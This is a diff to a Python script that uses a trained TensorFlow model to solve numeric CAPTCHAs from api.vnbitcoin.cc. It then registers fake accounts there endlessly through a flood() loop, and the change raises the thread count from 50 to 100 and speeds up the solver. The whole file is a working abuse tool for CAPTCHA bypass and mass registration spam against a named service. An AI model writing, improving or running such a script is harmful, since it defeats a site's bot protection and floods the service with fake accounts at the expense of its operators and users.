@@ -13,7 +13,7 @@ from tensorflow import keras
 from tensorflow.keras import layers
 
 captcha_dir = "./captcha_tmp"
-loaded_model = tf.keras.models.load_model('./vnbitcoin_captcha')
+loaded_model = tf.keras.models.load_model('./vnbitcoin_captcha', compile=False)
 batch_size = 16
 
 # Desired image dimensions
@@ -24,9 +24,6 @@ all_chars =  ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
 base_url = 'https://api.vnbitcoin.cc'
 reg_url = base_url + "/v1/User/reg"
 cap_url = base_url + "/v1/User/cap"
-
-
-# If you use the Tor
 
 
 def register(data):
@@ -42,13 +39,18 @@ def get_captcha():
 	cap_id = data["id"]
 	base64_img = data['base_64_blob'].split(',')[1]
 
-	filename = captcha_dir + "/" + cap_id + ".png"
+	# filename = captcha_dir + "/" + cap_id + ".png"
 
-	imgdata = base64.b64decode(base64_img)
-	with open(filename, 'wb') as f:
-		f.write(imgdata)
+	# imgdata = base64.b64decode(base64_img)
 
-	return (cap_id, filename)
+	# im = Image.open(BytesIO(base64.b64decode(base64_img)))
+
+	# with open(filename, 'wb') as f:
+	# 	f.write(imgdata)
+	base64_img = base64_img.replace("+", "-")
+	base64_img = base64_img.replace("/", "_")
+
+	return (cap_id, base64_img)
 
 
 # Mapping characters to integers
@@ -62,6 +64,18 @@ num_to_char = layers.StringLookup(
     mask_token=None, 
     invert=True
 )
+
+
+def encode_faster(base64_img, label):
+    img = tf.io.decode_base64(base64_img) 
+    img = tf.io.decode_jpeg(img, channels=1)
+    img = tf.image.convert_image_dtype(img, tf.float32)
+    img = tf.image.resize(img, [img_height, img_width])
+    img = tf.transpose(img, perm=[1, 0, 2])
+    label = char_to_num(tf.strings.unicode_split(label, input_encoding="UTF-8"))
+
+    return {"image": img, "label": label}
+
 
 def encode_single_sample(img_path, label):
     # 1. Read image
@@ -98,11 +112,11 @@ def decode_batch_predictions(pred):
 
 
 
-def solve_captcha(cap_id, filename):
-	real_data = tf.data.Dataset.from_tensor_slices(([filename], ['1111']))
+def solve_captcha(cap_id, image):
+	real_data = tf.data.Dataset.from_tensor_slices(([image], ['1111']))
 	real_data = (
 	    real_data.map(
-	        encode_single_sample, num_parallel_calls=tf.data.AUTOTUNE
+	        encode_faster, num_parallel_calls=tf.data.AUTOTUNE
 	    )
 	    .batch(batch_size)
 	    .prefetch(buffer_size=tf.data.AUTOTUNE)
@@ -141,8 +155,8 @@ def clean_up(filename):
 
 def flood():
 	while True:
-		cap_id, filename = get_captcha()
-		cap_sol = solve_captcha(cap_id, filename)
+		cap_id, image = get_captcha()
+		cap_sol = solve_captcha(cap_id, image)
 		name = random_name
 		reg_data = {
 			'vid': cap_id,
@@ -155,27 +169,33 @@ def flood():
 		}
 
 		register(reg_data)
-		clean_up(filename)
+		# clean_up(filename)
 
 
 # clean start
-clean_all_png_cmd = "rm " + captcha_dir + "/*.png"
-os.system(clean_all_png_cmd)
+# clean_all_png_cmd = "rm " + captcha_dir + "/*.png"
+# os.system(clean_all_png_cmd)
 
 # flood()
 
+
+# cap_id, image = get_captcha()
+
+# print(image)
+# encode_faster(image, '1111')
+
 threads = []
 
-for i in range(50):
+for i in range(100):
 	t = threading.Thread(target=flood)
 	t.daemon = True
 	threads.append(t)
 
 
-for i in range(50):
+for i in range(100):
 	threads[i].start()
 
-for i in range(50):
+for i in range(100):
 	threads[i].join()
 
 
